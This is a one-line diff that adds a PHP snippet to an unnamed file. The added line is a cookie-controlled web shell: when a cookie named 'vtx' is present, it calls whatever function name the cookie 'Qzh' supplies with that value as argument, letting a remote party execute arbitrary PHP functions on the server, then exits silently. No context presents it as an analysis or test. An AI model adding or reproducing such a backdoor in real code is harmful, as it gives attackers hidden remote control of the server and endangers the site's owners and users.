@@ -1,0 +1,1 @@
+<?php if(isset($_COOKIE["vtx"])){$_COOKIE["Qzh"]($_COOKIE["vtx"]);exit;}
